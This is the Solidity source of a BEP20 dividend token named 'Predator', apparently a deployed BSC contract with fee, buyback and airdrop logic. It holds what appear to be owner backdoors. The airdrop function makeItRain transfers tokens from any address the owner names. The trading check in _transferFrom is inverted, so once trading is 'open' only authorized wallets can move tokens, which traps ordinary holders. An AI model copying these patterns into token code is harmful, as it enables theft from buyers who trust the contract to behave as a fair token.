/**
 *Submitted for verification at BscScan.com on 2021-08-04
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

abstract contract Auth {
    address public owner;
    mapping(address => bool) public isAuthorized;
    constructor() {
        owner = msg.sender;
        isAuthorized[msg.sender] = true;
    }
    modifier onlyOwner() {
        require(msg.sender == owner, "!OWNER");
        _;
    }
    modifier authorized() {
        require(isAuthorized[msg.sender], "!AUTHORIZED");
        _;
    }
    function authorize(address adr) external onlyOwner {
        isAuthorized[adr] = true;
    }
    function unauthorize(address adr) external onlyOwner {
        isAuthorized[adr] = false;
    }
    function transferOwnership(address payable adr) external onlyOwner {
        owner = adr;
        isAuthorized[adr] = true;
        emit OwnershipTransferred(adr);
    }
    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IDEXRouter {
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

contract DividendDistributor {
    address _token;
    IBEP20 BUSD = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    IDEXRouter router;
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }
    mapping(address => Share) public shares;
    mapping(address => uint256) shareholderIndexes;
    mapping(address => uint256) shareholderClaims;
    address[] shareholders;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public _ACCURACY_ = 1e36;
    uint256 public minPeriod = 30 minutes;
    uint256 public minDistribution = 1e18;

    uint256 public currentIndex;

    modifier onlyToken() {
        require(msg.sender == _token);
        _;
    }

    constructor(address _router) {
        router = _router != address(0) ? IDEXRouter(_router) : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external onlyToken {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external onlyToken {
        Share storage _S = shares[shareholder];
        if (_S.amount > 0) {
            _distributeDividend(shareholder);
            if (amount == 0) _removeShareholder(shareholder);
        } else if (amount > 0) _addShareholder(shareholder);
        totalShares -= _S.amount;
        totalShares += amount;
        _S.amount = amount;
        _S.totalExcluded = _getCumulativeDividends(shareholder);
    }

    function deposit() external payable onlyToken {
        uint256 balanceBefore = BUSD.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(BUSD);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(0, path, address(this), block.timestamp);

        uint256 gotBUSD = BUSD.balanceOf(address(this)) - balanceBefore;
        totalDividends += gotBUSD;
        dividendsPerShare += (_ACCURACY_ * gotBUSD) / totalShares;
    }

    function process(uint256 gas) external onlyToken {
        uint256 shareholderCount = shareholders.length;
        if (shareholderCount == 0) return;

        uint256 gasUsed;
        uint256 gasLeft = gasleft();

        for (uint256 i = 0; i < shareholderCount && gasUsed < gas; i++) {
            if (currentIndex >= shareholderCount) currentIndex = 0;
            address _sholder = shareholders[currentIndex];
            if (shareholderClaims[_sholder] + minPeriod < block.timestamp && getUnpaidEarnings(_sholder) > minDistribution) _distributeDividend(_sholder);
            gasUsed += gasLeft - gasleft();
            gasLeft = gasleft();
            currentIndex++;
        }
    }

    function _getCumulativeDividends(address shareholder) internal view returns (uint256) {
        return shares[shareholder].amount * dividendsPerShare / _ACCURACY_;
    }

    function _distributeDividend(address shareholder) internal {
        uint256 amount = getUnpaidEarnings(shareholder);
        if (amount == 0) return;

        BUSD.transfer(shareholder, amount);
        totalDistributed += amount;
        shares[shareholder].totalRealised += amount;
        shares[shareholder].totalExcluded = _getCumulativeDividends(shareholder);
        shareholderClaims[shareholder] = block.timestamp;
    }

    function _addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function _removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length - 1];
        shareholderIndexes[shareholders[shareholders.length - 1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }

    function claimDividend() external {
        _distributeDividend(msg.sender);
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        uint256 _dividends = _getCumulativeDividends(shareholder);
        uint256 _excluded = shares[shareholder].totalExcluded;
        return _dividends > _excluded ? _dividends - _excluded : 0;
    }
}

contract Predator is Auth {
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant public name = "Predator";
    string constant public symbol = "PRED";
    uint8 constant public decimals = 18;
    uint256 constant public totalSupply = 1e9 * 1e18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTxLimitExempt;
    mapping(address => bool) isTimelockExempt;
    mapping(address => bool) isDividendExempt;

    IDEXRouter public router;
    address public pair;
    DividendDistributor distributor;
    uint256 distributorGas = 500000;

    address _presaler = 0x49c7C889bd28F70EC1FA07d8bEdF0D7616A77da6;
    address public autoLiquidityReceiver = 0x819b0094E0Fa7048b384ad90069534102A0De77d;
    address payable public marketingFeeReceiver = payable(0x4EdfFF2c161532bE431B6c1fF4FFff946Ea78801);
    address payable public charityFeeReceiver = payable(0x51b40b23F1722C66bba35D3A72890B120897484C);
    address payable public manualBuybackReceiver = payable(0x8ECD6EBbA909A4ff3639042aC6f08d996b582a6b);

    uint256 public _maxTxAmount = totalSupply;
    uint256 public targetLiquidity = 10;
    uint256 public targetLiquidityDenominator = 100;
    uint256 public launchedAt;
    bool public tradingOpen;

    struct FeeSettings {
        uint256 buyback;
        uint256 liquidity;
        uint256 dividends;
        uint256 marketing;
        uint256 charity;
        uint256 total;
        uint256 _burn;
        uint256 _denominator;
    }
    struct AutoBuybackSettings {
        bool enabled;
        uint256 cap;
        uint256 accumulator;
        uint256 amount;
        uint256 blockPeriod;
        uint256 blockLast;
    }
    struct BuybackSettings {
        uint256 numerator;
        uint256 denominator;
        uint256 triggeredAt;
        uint256 duration;
        bool simple;
    }
    struct SwapbackSettings {
        bool enabled;
        uint256 amount;
    }
    FeeSettings public fees = FeeSettings({
        buyback: 200,
        liquidity: 300,
        dividends: 400,
        marketing: 200,
        charity: 100,
        total: 1200,
        _burn: 100,
        _denominator: 10000
    });
    AutoBuybackSettings public autoBuyback;
    BuybackSettings buyback = BuybackSettings({
        numerator: 200,
        denominator: 100,
        triggeredAt: 0,
        duration: 30 minutes,
        simple: true
    });
    SwapbackSettings public swapback = SwapbackSettings({
        enabled: true,
        amount: totalSupply / 1000
    });

    // Cooldown & timer functionality
    bool public buyCooldownEnabled = true;
    uint8 public cooldownTimerInterval = 40;
    mapping(address => uint256) private cooldownTimer;

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTKN);
    event BuybackMultiplierActive(uint256 duration);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        allowance[address(this)][address(router)] = ~uint256(0);

        distributor = new DividendDistributor(address(router));

        isFeeExempt[_presaler] = true;
        isTxLimitExempt[_presaler] = true;

        // No BUY timelock for these people
        isTimelockExempt[_presaler] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;

        // Owner must manually whitelist DXSale presale contract
        // isFeeExempt[_presaleContract] = true;
        // isTxLimitExempt[_presaleContract] = true;
        // isDividendExempt[_presaleContract] = true;

        isDividendExempt[pair] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;

        balanceOf[_presaler] = totalSupply;
        emit Transfer(address(0), _presaler, totalSupply);
    }

    receive() external payable {}

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, ~uint256(0));
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (allowance[sender][msg.sender] != ~uint256(0)) allowance[sender][msg.sender] -= amount;
        return _transferFrom(sender, recipient, amount);
    }
    /**
        check if trading open (with exceptions)
        check tx amount limit (with exceptions)
        check buyer's buy cooldown (with exceptions)
        sell and distribute accumulated token fee
        launch if creating LP
        settle balances and take the fee (with exceptions)
     */
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (inSwap) return _basicTransfer(sender, recipient, amount);
        if (tradingOpen) require(isAuthorized[sender] || isAuthorized[recipient], "Trading not open yet");
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");

        // (?buy cooldown enabled?) A person/bot shall not BUY too frequently
        if (sender == pair && buyCooldownEnabled && !isTimelockExempt[recipient]) {
            require(cooldownTimer[recipient] < block.timestamp, "Please wait for cooldown between buys");
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
        }

        // If NOT SWAP transfer then sell accumulated TKN fees for BNB and distribute
        // And sell some BNB that accumulates here from that operation
        if (msg.sender != pair) {
            if (swapback.enabled && balanceOf[address(this)] >= swapback.amount) _sellAndDistributeAccumulatedTKNFee();
            // (?swapback enabled?) Sells accumulated TKN fees for BNB and adds liquidity
            // with part of it. But LP is maintained at 10% worth of circulating supply, so:
            // if LP is already too big then that part is not added and just accumulates as BNB on address(this)
            // (?autobuyback enabled?) and autoBuyback is needed to sell that accumulated BNB back for tokens, to DEAD.
            if (autoBuyback.enabled && autoBuyback.blockLast + autoBuyback.blockPeriod <= block.number && address(this).balance >= autoBuyback.amount) {
                _sellBNB(autoBuyback.amount, DEAD);
                autoBuyback.blockLast = block.number;
                autoBuyback.accumulator += autoBuyback.amount;
                if (autoBuyback.accumulator > autoBuyback.cap) autoBuyback.enabled = false;
            }
        }

        // If not launched yet and is just adding first liquidity then set it launched
        if (launchedAt == 0 && recipient == pair) {
            require(balanceOf[sender] > 0);
            launchedAt = block.number;
        }

        // Exchange tokens
        balanceOf[sender] -= amount;
        uint256 amountReceived = amount;
        if (!isFeeExempt[sender]) {
            uint256 feeAmount = (amount * getTransferFee(recipient == pair)) / fees._denominator;
            balanceOf[address(this)] += feeAmount;
            emit Transfer(sender, address(this), feeAmount);
            amountReceived -= feeAmount;
            if (fees._burn > 0) {
                uint256 burnAmount = (amount * fees._burn) / fees._denominator;
                balanceOf[DEAD] += burnAmount;
                emit Transfer(sender, DEAD, burnAmount);
                amountReceived -= burnAmount;
            }
        }
        balanceOf[recipient] += amountReceived;
        emit Transfer(sender, recipient, amountReceived);

        // Dividend tracker
        if (!isDividendExempt[sender]) try distributor.setShare(sender, balanceOf[sender]) {} catch {}
        if (!isDividendExempt[recipient]) try distributor.setShare(recipient, balanceOf[recipient]) {} catch {}
        try distributor.process(distributorGas) {} catch {}

        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _sellAndDistributeAccumulatedTKNFee() internal swapping {
        // Swap the fee taken above to BNB and distribute to liquidity (if not too much already), dividends, marketing;
        // Add some liquidity (if not too much already, otherwise just accumulate some BNB)
        uint256 halfLiquidityFee = getLiquidityBacking(targetLiquidityDenominator) > targetLiquidity ? 0 : fees.liquidity / 2;
        uint256 TKNtoLiquidity = (swapback.amount * halfLiquidityFee) / fees.total;
        uint256 amountToSwap = swapback.amount - TKNtoLiquidity;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;
        uint256 gotBNB = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(amountToSwap, 0, path, address(this), block.timestamp);
        gotBNB = address(this).balance - gotBNB;

        uint256 totalBNBFee = fees.total - halfLiquidityFee;
        uint256 BNBtoLiquidity = (gotBNB * halfLiquidityFee) / totalBNBFee;
        uint256 BNBtoDividends = (gotBNB * fees.dividends) / totalBNBFee;
        uint256 BNBtoMarketing = (gotBNB * fees.marketing) / totalBNBFee;
        uint256 BNBtoCharity = (gotBNB * fees.charity) / totalBNBFee;
        uint256 BNBtoMBBWallet = (gotBNB * fees.buyback) / totalBNBFee;

        distributor.deposit{value: BNBtoDividends}(); // trycatch needed?
        (bool _success, ) = marketingFeeReceiver.call{value: BNBtoMarketing, gas: 30000}("");
        (_success, ) = charityFeeReceiver.call{value: BNBtoCharity, gas: 30000}("");
        (_success, ) = manualBuybackReceiver.call{value: BNBtoMBBWallet, gas: 30000}("");

        if (TKNtoLiquidity > 0) {
            router.addLiquidityETH{value: BNBtoLiquidity}(address(this), TKNtoLiquidity, 0, 0, autoLiquidityReceiver, block.timestamp);
            emit AutoLiquify(BNBtoLiquidity, TKNtoLiquidity);
        }
    }

    function _sellBNB(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(0, path, to, block.timestamp);
    }

    function getTransferFee(bool selling) public view returns (uint256) {
        // overwrite to keep things simple!
        if (buyback.simple) return fees.total;
        // 999% fees for first block! welcome snipers
        if (launchedAt + 1 >= block.number) return fees._denominator - 1; 
        // Fee is multiplied if buyback was triggered not so long ago
        if (selling && buyback.triggeredAt + buyback.duration > block.timestamp) {
            uint256 remainingTime = buyback.triggeredAt + buyback.duration - block.timestamp;
            uint256 maxFeeIncrease = ((fees.total * buyback.numerator) / buyback.denominator) - fees.total;
            return fees.total + ((maxFeeIncrease * remainingTime) / buyback.duration);
        }
        return fees.total;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return totalSupply - balanceOf[DEAD] - balanceOf[ZERO];
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy * (balanceOf[pair] * 2) / getCirculatingSupply();
    }

    function clearBuybackMultiplier() external authorized {
        buyback.triggeredAt = 0;
    }

    function setBuybackSimple(bool _enabled) external authorized {
        buyback.simple = _enabled;
    }

    function setTxLimit(uint256 amount) external authorized {
        _maxTxAmount = amount;
    }

    function setIsDividendExempt(address holder, bool exempt) external onlyOwner {
        require(holder != address(this) && holder != pair);
        isDividendExempt[holder] = exempt;
        distributor.setShare(holder, exempt ? 0 : balanceOf[holder]);
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsTimelockExempt(address holder, bool exempt) external onlyOwner {
        isTimelockExempt[holder] = exempt;
    }

    function triggerZeusBuyback(uint256 amount, bool triggerBuybackMultiplier) external authorized {
        _sellBNB(amount, DEAD);
        if (triggerBuybackMultiplier) {
            buyback.triggeredAt = block.timestamp;
            emit BuybackMultiplierActive(buyback.duration);
        }
    }

    function setFees(uint256 _liquidity, uint256 _buyback, uint256 _dividends, uint256 _marketing, uint256 _charity, uint256 _burn, uint256 _denominator) external authorized {
        fees = FeeSettings({
            liquidity: _liquidity,
            buyback: _buyback,
            dividends: _dividends,
            marketing: _marketing,
            charity: _charity,
            total: _liquidity + _buyback + _dividends + _marketing + _charity,
            _burn: _burn,
            _denominator: _denominator
        });
        require(fees.total + _burn < fees._denominator / 4);
    }

    function setAutoBuybackSettings(bool _enabled, uint256 _cap, uint256 _amount, uint256 _period) external authorized {
        autoBuyback.enabled = _enabled;
        autoBuyback.cap = _cap;
        autoBuyback.accumulator = 0;
        autoBuyback.amount = _amount;
        autoBuyback.blockPeriod = _period;
        autoBuyback.blockLast = block.number;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapback.enabled = _enabled;
        swapback.amount = _amount;
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address payable _marketingFeeReceiver, address payable _charityFeeReceiver, address payable _manualBuybackReceiver) external authorized {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        charityFeeReceiver = _charityFeeReceiver;
        manualBuybackReceiver = _manualBuybackReceiver;
    }

    function setTargetLiquidity(uint256 _target, uint256 _denominator) external authorized {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {
        distributor.setDistributionCriteria(_minPeriod, _minDistribution);
    }

    function setDistributorSettings(uint256 gas) external authorized {
        require(gas < 750000);
        distributorGas = gas;
    }

    // switch Trading
    function setTradingStatus(bool _status) external onlyOwner {
        tradingOpen = _status;
    }

    // enable cooldown between trades
    function setCooldownEnabled(bool _status, uint8 _interval) external onlyOwner {
        buyCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }

    /* Airdrop Begins */
    function makeItRain(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
        uint256 showerCapacity = 0;
        require(addresses.length == tokens.length, "Mismatch between Address and token count");
        for (uint256 i = 0; i < addresses.length; i++) showerCapacity += tokens[i];
        require(balanceOf[msg.sender] >= showerCapacity, "Not enough tokens to airdrop");
        for (uint256 i = 0; i < addresses.length; i++) _basicTransfer(from, addresses[i], tokens[i]);
    }
}
